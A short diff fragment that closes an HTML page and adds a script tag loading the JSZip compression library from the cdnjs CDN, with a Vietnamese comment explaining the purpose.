+</script>
+<!-- Load JSZip từ CDN để hỗ trợ nén file -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</body>
+</html>
